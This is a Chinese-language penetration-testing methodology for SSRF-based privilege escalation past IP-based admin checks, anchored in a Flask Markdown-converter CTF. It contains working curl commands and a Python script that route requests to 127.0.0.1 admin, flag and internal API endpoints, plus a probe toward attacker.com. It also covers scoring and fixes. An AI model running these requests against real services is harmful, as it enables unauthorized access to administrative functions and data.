# SSRF 垂直权限提升攻击

## 1. 方法论概述

### 1.1 编写目的
本方法论指导渗透测试人员识别和利用通过服务器端请求伪造（SSRF）实现的垂直权限提升漏洞，特别是绕过 IP 基础授权机制的攻击技术。

### 1.2 适用范围
- 使用 IP 地址进行访问控制的应用
- 存在 SSRF 漏洞的内部服务
- localhost/内网访问限制
- 网络层授权机制

### 1.3 读者对象
- 渗透测试工程师
- 红队成员
- 安全研究人员

---

## 2. 技术原理

### 2.1 垂直权限提升定义

**垂直权限提升：** 低权限用户访问高权限功能

**SSRF 实现方式：**
```
外部攻击者（无权限）
    ↓ SSRF 请求
内部服务（127.0.0.1，有权限）
    ↓ 访问受保护资源
高权限功能/数据
```

### 2.2 IP 基础授权机制

**典型代码：**
```python
# Flask
@app.route('/admin')
def admin():
    if request.remote_addr != '127.0.0.1':
        abort(403)
    return admin_panel()
```

**漏洞本质：**
- 使用网络层信息作为应用层授权
- 无法区分真实用户和代理请求
- SSRF 可模拟受信任 IP

---

## 3. 攻击场景

### 3.1 场景 1：Admin 端点访问

**目标：** 访问 /admin 管理界面

**攻击步骤：**
```bash
# 直接访问（被阻止）
curl http://target/admin
# HTTP 403 Forbidden

# SSRF 绕过
curl -X POST http://target/convert \
  -d "url=http://127.0.0.1/admin"
# HTTP 200 OK - 返回 admin 页面
```

### 3.2 场景 2：Flag 端点访问

**目标：** 获取 /admin/flag 中的敏感数据

**攻击步骤：**
```bash
curl -X POST http://target/convert \
  -d "url=http://127.0.0.1/admin/flag"
```

**预期响应：**
```html
<p>Your flag is: flag{cbf59a8d-b5f1-4a8e-8286-0c249b14d682}</p>
```

### 3.3 场景 3：内部 API 访问

**目标：** 访问内部 REST API

**攻击步骤：**
```bash
# 枚举内部 API
curl -X POST http://target/proxy \
  -d "url=http://127.0.0.1:8080/api/users"

curl -X POST http://target/proxy \
  -d "url=http://127.0.0.1:8080/api/admin/config"
```

---

## 4. 探测与验证

### 4.1 识别 IP 保护端点

```bash
# 常见 admin 路径
for path in /admin /admin/flag /internal /management /debug; do
    response=$(curl -s -o /dev/null -w "%{http_code}" http://target$path)
    if [ "$response" = "403" ]; then
        echo "[+] Protected endpoint: $path"
    fi
done
```

### 4.2 识别 SSRF 端点

```bash
# 测试 URL 处理功能
curl -X POST http://target/convert \
  -d "url=http://attacker.com/test"

# 检查服务器是否发起请求（通过 DNSLog 等）
```

### 4.3 验证权限提升

```bash
# 比较直接访问和 SSRF 访问的响应
direct=$(curl -s http://target/admin)
ssrf=$(curl -s -X POST http://target/convert \
       -d "url=http://127.0.0.1/admin")

if [ ${#ssrf} -gt ${#direct} ]; then
    echo "[+] Privilege escalation successful!"
fi
```

---

## 5. 利用方法

### 5.1 基础利用

```bash
curl -X POST http://localhost:42369/convert \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "url=http://127.0.0.1/admin/flag"
```

### 5.2 自动化脚本

```python
#!/usr/bin/env python3
import requests

TARGET = "http://localhost:42369"
SSRF_ENDPOINT = "/convert"
ADMIN_ENDPOINTS = ["/admin", "/admin/flag", "/internal", "/debug"]

for endpoint in ADMIN_ENDPOINTS:
    response = requests.post(
        f"{TARGET}{SSRF_ENDPOINT}",
        data={"url": f"http://127.0.0.1{endpoint}"}
    )
    
    if response.status_code == 200:
        print(f"[+] Accessed: {endpoint}")
        print(response.text[:200])
```

---

## 6. 影响评估

### 6.1 危害等级
- **未授权访问管理功能：** Critical
- **敏感数据泄露：** Critical
- **完全权限提升：** Critical

### 6.2 CVSS 评分
- **基础分数：** 9.1 (Critical)
- **攻击向量：** Network (AV:N)
- **攻击复杂度：** Low (AC:L)
- **权限要求：** None (PR:N)

---

## 7. 修复建议

### 7.1 使用真正的认证

```python
# ❌ 不安全
if request.remote_addr != '127.0.0.1':
    abort(403)

# ✅ 安全
from flask_login import login_required

@app.route('/admin')
@login_required
def admin():
    if not current_user.is_admin:
        abort(403)
    return admin_panel()
```

### 7.2 SSRF 防护

```python
def is_safe_url(url):
    from urllib.parse import urlparse
    import ipaddress
    import socket
    
    parsed = urlparse(url)
    if parsed.scheme not in ['http', 'https']:
        return False
    
    ip = socket.gethostbyname(parsed.hostname)
    if ipaddress.ip_address(ip).is_private:
        return False
    
    return True
```

---

## 8. 参考资源

- [OWASP SSRF Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [OWASP Access Control Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Access_Control_Cheat_Sheet.html)

---

## 9. 实战案例

### 9.1 CTF 挑战

**目标：** Flask Markdown 转换器

**利用：**
```bash
curl -X POST http://localhost:42369/convert \
  -d "url=http://127.0.0.1/admin/flag"
```

**结果：** 成功获取 Flag
